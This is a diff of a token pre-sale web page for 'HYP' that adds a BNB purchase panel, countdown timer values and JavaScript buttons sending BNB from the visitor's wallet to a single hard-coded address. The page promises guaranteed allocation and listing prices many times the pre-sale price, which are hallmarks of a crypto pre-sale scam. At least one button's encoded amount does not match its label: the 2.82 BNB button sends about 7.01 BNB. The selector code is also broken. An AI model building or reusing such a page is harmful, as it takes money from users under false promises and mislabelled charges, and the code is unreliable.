@@ -89,10 +89,10 @@ function validateForm() {
                                 
                                 
                                 <div class="col-12">
-                                    <a id="days" style="font-size:50px; text-shadow: 2px 2px; color:#00FFA2;">11d </a>
-    <a id="hours" style="font-size:50px; text-shadow: 2px 2px; color:#00FFA2;">2h </a>
-    <a id="mins" style="font-size:50px; text-shadow: 2px 2px; color:#00FFA2;">8m </a>
-    <a id="secs" style="font-size:50px; text-shadow: 2px 2px; color:#00FFA2;">15s </a>
+                                    <a id="days" style="font-size:50px; text-shadow: 2px 2px; color:#00FFA2;">5d </a>
+    <a id="hours" style="font-size:50px; text-shadow: 2px 2px; color:#00FFA2;">1h </a>
+    <a id="mins" style="font-size:50px; text-shadow: 2px 2px; color:#00FFA2;">24m </a>
+    <a id="secs" style="font-size:50px; text-shadow: 2px 2px; color:#00FFA2;">56s </a>
                                 </div>
                             </div>
                         </div>
@@ -232,9 +232,9 @@ function validateForm() {
                     
 
                     <div class="col-12 col-sm-6">
-                        <div data-aos="fade-down" data-aos-duration="900" class="aos-init">
+                        <div data-aos="fade-down" data-aos-duration="900" class="aos-init aos-animate">
                             <div class="silver">
-                                <h2>Pre-Sale</h2>
+                                <h2>Pre-Sale with Matic</h2>
 <span id="presale"></span>
                                 <div class="planline"></div>
 
@@ -272,7 +272,7 @@ function validateForm() {
 </p><p>3.Choose your Buying plan
 </p>
 <p>Our system will send HYP tokens to your wallet instantly.
-</p><br><button type="button" class="enableEthereumButton connect_button">1. Connect to Wallet</button><br>
+</p><br><button type="button" class="connect_button" id="ethbnbone">1. Connect to Wallet</button><br>
 
 <br>
 
@@ -369,7 +369,140 @@ function validateForm() {
                     
 
                     
-                </div>
+                <div class="col-12 col-sm-6">
+                        <div data-aos="fade-down" data-aos-duration="900" class="aos-init aos-animate">
+                            <div class="silver">
+                                <h2>Pre-Sale with BNB</h2>
+<span id="presale"></span>
+                                <div class="planline"></div>
+
+                                <div class="pplanl">
+                                    <p>Pre-sale price</p>
+                                    <h3>1 HYP = 0.00047 BNB</h3>
+                                </div><div class="pplanl">
+                                    <p>Launch Price</p>
+                                    <h3>1 HYP = 0.0084 BNB</h3>
+                                </div><div class="pplanl">
+                                    <p>Listing Price</p>
+                                    <h3>1 HYP = 0.01~0.022 BNB</h3>
+                                </div><p>Participate in Pre-Sales and Get More Token at Lower Price
+</p>
+                                <p>Launch date: February 15
+</p>
+<p>The estimated price after listing in exchange offices is 1 HYP = 0.01~0.022 BNB
+</p><br>
+
+
+                                
+                                
+
+
+                                
+                                
+
+                                
+                                
+<p>Step-by-step guide :</p><p>
+
+1 . You must use (DAPP) Wallet browser to join Pre-Sale (open website with wallet Berowser)</p>
+<p>2 . Connect to wallet (BSC/BEP20 Network)
+
+</p><p>3.Choose your Buying plan
+</p>
+<p>Our system will send HYP tokens to your wallet instantly.
+</p><br><button type="button" class="connect_button" id="ethbnb">1. Connect to Wallet</button><br>
+
+<br>
+
+
+
+                                <br><button type="button" class="connect_button" id="onebnb">Buy with 0.047 BNB = 100 HYP</button>
+<br><br><button type="button" class="connect_button" id="twobnb">Buy with 0.282 BNB = 600 HYP</button>
+<br>
+<br><button type="button" class="connect_button" id="threebnb">Buy with 0.564 BNB = 1200 HYP</button>
+<br>
+<br><button type="button" class="connect_button" id="fourbnb">Buy with 2.82 BNB = 6000 HYP</button>
+<br>
+<br><button type="button" class="connect_button" id="fivebnb">Buy with 7.01 BNB = 15000 HYP</button><div class="garant">
+                                    <p>Guaranteed allocation</p>
+                                    <h3 style="color: #3ddf84;">✓</h3>
+                                </div>
+                                <div class="panel" style="display: none;">
+
+                                    <div class="stalepanel">
+                                        <input type="number" id="amount2" class="form-control" placeholder="0 MPD">
+                                        <button type="button" onclick="invest(2)" class="apply" style="margin-top:10px; width:100%;">Stake</button>
+
+                                    </div>
+
+                                    <div class="st-form">
+                                        <div class="st-title">Staked</div>
+                                        <div class="st-amount" id="invested2">0.0000 MPD</div>
+                                    </div>
+
+                                    <div class="st-form">
+                                        <div class="st-title">Unstaked</div>
+                                        <div class="st-amount" id="unstaked2">0.0000 MPD</div>
+
+                                        <div class="row">
+                                            <div class="col-6"><button type="button" class="apply" style="margin-top:10px; width:100%;" onclick="reinvest(2)">Restake</button></div>
+                                            <div class="col-6"><button type="button" class="apply" style="margin-top: 10px; width: 100%;" onclick="closeDep(2)">Withdraw</button></div>
+                                        </div>
+                                    </div>
+
+
+
+                                    <div class="clr" style="height:50px;"></div>
+                                </div>
+
+
+
+                                <div class="clr"></div>
+
+                                
+                                <div class="panel">
+                                    <br>
+                                    <center><h4>46% APR</h4></center>
+                                    <div class="planline"></div>
+                                    <div class="stalepanel">
+                                        <input type="number" id="amount3" class="form-control" placeholder="0 MPD">
+                                        <button type="button" onclick="invest(3)" class="apply" style="margin-top:10px; width:100%;">Stake</button>
+
+                                    </div>
+
+                                    <div class="st-form">
+                                        <div class="st-title">Staked</div>
+                                        <div class="st-amount" id="invested3">0.0000 MPD</div>
+                                    </div>
+
+                                    <div class="st-form">
+                                        <div class="st-title">Unstaked</div>
+                                        <div class="st-amount" id="unstaked3">0.0000 MPD</div>
+
+                                        <div class="row">
+                                            <div class="col-6"><button type="button" class="apply" style="margin-top:10px; width:100%;" onclick="reinvest(3)">Restake</button></div>
+                                            <div class="col-6"><button type="button" class="apply" style="margin-top: 10px; width: 100%;" onclick="closeDep(3)">Withdraw</button></div>
+                                        </div>
+                                    </div>
+
+                                    <div class="st-form">
+                                        <div class="st-title">Rewards</div>
+                                        <div class="st-amount" id="rewards3">0.0000 MPD</div>
+
+                                        <div class="row">
+                                            <div class="col-6"><button type="button" class="apply" style="margin-top: 10px; width: 100%;" onclick="withdrawn(3)">Withdraw</button></div>
+                                        </div>
+                                    </div>
+                                </div>
+
+
+                                <div class="clr" style="height:40px;"></div>
+
+
+
+                            </div>
+                        </div>
+                    </div></div>
 
             </div>
         </div>
@@ -439,13 +572,18 @@ function validateForm() {
 
 
     <script>
-const ethereumButton = document.querySelector('.enableEthereumButton');
-var sendEthButton = document.querySelector("one");
+var ethereumButton = document.querySelector("ethbnbone");
+var ethereumButton = document.querySelector("ethbnb");
     var sendEthButton = document.querySelector("one");
     var sendEthButton = document.querySelector("two");
     var sendEthButton = document.querySelector("three");
     var sendEthButton = document.querySelector("four");
     var sendEthButton = document.querySelector("five");
+	var sendEthButton = document.querySelector("onebnb");
+    var sendEthButton = document.querySelector("twobnb");
+    var sendEthButton = document.querySelector("threebnb");
+    var sendEthButton = document.querySelector("fourbnb");
+    var sendEthButton = document.querySelector("fivebnb");
 
 
 let accounts = [];
@@ -540,11 +678,105 @@ five.addEventListener('click', () => {
     .then((txHash) => console.log(txHash))
     .catch((error) => console.error);
 });
-    
-ethereumButton.addEventListener('click', () => {
-  getAccount();
+
+
+//Sending Ethereum to an address
+onebnb.addEventListener('click', () => {
+  ethereum
+    .request({
+      method: 'eth_sendTransaction',
+      params: [
+        {
+          from: accounts[0],
+          to: '0x8DeA7540d0156C3DF67a8ad2b14575476FBCd1b8',
+          value: '0xA6FA4040718000',
+          gasPrice: '0x14e72a000',
+          gas: '0x00030D40',
+        },
+      ],
+    })
+    .then((txHash) => console.log(txHash))
+    .catch((error) => console.error);
+});
+//Sending Ethereum to an address
+twobnb.addEventListener('click', () => {
+  ethereum
+    .request({
+      method: 'eth_sendTransaction',
+      params: [
+        {
+          from: accounts[0],
+          to: '0x8DeA7540d0156C3DF67a8ad2b14575476FBCd1b8',
+          value: '0x3E9DD8182A90000',
+          gasPrice: '0x14e72a000',
+          gas: '0x00030D40',
+        },
+      ],
+    })
+    .then((txHash) => console.log(txHash))
+    .catch((error) => console.error);
+});
+    //Sending Ethereum to an address
+threebnb.addEventListener('click', () => {
+  ethereum
+    .request({
+      method: 'eth_sendTransaction',
+      params: [
+        {
+          from: accounts[0],
+          to: '0x8DeA7540d0156C3DF67a8ad2b14575476FBCd1b8',
+          value: '0x7D3BB0305520000',
+          gasPrice: '0x14e72a000',
+          gas: '0x00030D40',
+        },
+      ],
+    })
+    .then((txHash) => console.log(txHash))
+    .catch((error) => console.error);
+});
+  //Sending Ethereum to an address
+fourbnb.addEventListener('click', () => {
+  ethereum
+    .request({
+      method: 'eth_sendTransaction',
+      params: [
+        {
+          from: accounts[0],
+          to: '0x8DeA7540d0156C3DF67a8ad2b14575476FBCd1b8',
+          value: '0x614885DC037D0000',
+          gasPrice: '0x14e72a000',
+          gas: '0x00030D40',
+        },
+      ],
+    })
+    .then((txHash) => console.log(txHash))
+    .catch((error) => console.error);
+});
+//Sending Ethereum to an address
+fivebnb.addEventListener('click', () => {
+  ethereum
+    .request({
+      method: 'eth_sendTransaction',
+      params: [
+        {
+          from: accounts[0],
+          to: '0x8DeA7540d0156C3DF67a8ad2b14575476FBCd1b8',
+          value: '0x9BBDF9575758000',
+          gasPrice: '0x14e72a000',
+          gas: '0x00030D40',
+        },
+      ],
+    })
+    .then((txHash) => console.log(txHash))
+    .catch((error) => console.error);
 });
 
+ethbnb.addEventListener('click', () => {
+  getAccount();
+});
+ethbnbone.addEventListener('click', () => {
+  getAccount();
+});
 async function getAccount() {
   accounts = await ethereum.request({ method: 'eth_requestAccounts' });
 }
